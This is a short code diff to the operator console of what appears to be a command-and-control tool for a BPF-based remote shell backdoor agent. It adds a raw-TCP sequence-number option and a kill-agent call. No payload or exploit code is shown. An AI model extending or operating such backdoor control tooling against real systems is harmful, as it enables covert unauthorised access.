@@ -107,12 +107,20 @@ class C2Cmd(Cmd):
 
         tcp_parser = subparsers.add_parser("tcp", help="Send a shell command over TCP")
         self._add_common_opts(tcp_parser)
+        tcp_parser.add_argument(
+            "--seq",
+            type=int,
+            default=5445,
+            help="Sequence number for TCP Raw packet (default: 5445)",
+        )
         udp_parser = subparsers.add_parser("udp", help="Send a shell command over UDP")
         self._add_common_opts(udp_parser)
         try:
             kill_args = parser.parse_args(shlex.split(arg))
         except c2parser.BadArgument:
             return
+
+        self.c2.kill_agent(kill_args)
 
     def do_configure(self, arg: str) -> None:
         """Stamps the BPF Remote Shell Executable Agent with the provided arguments.
